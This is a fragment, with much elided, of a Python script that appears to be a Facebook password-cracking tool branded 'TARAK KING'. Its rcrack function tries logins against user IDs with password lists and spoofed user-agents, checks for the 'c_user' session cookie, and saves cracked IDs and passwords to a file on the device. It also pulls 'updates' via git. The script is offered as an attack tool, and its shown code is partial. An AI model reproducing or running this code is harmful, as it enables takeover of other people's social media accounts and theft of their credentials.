...
print("\033[1;92m   [[[😈]][[😈]][[😈]][[😈]][[😈]][[😈]][[😈]][[😈]][[😈]]] UPDATE CHECKING BOSS TARAK KING \033[1;30m")
os.system('espeak -a 300 "WAITING FOR UPDATE BANGlADESH TARAK KING OFF TARAK "')
os.system("git pull")
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[38;5;46m [TARAK💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/033[38;5;46mTARAK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}TARAK\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46mTARAK💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()
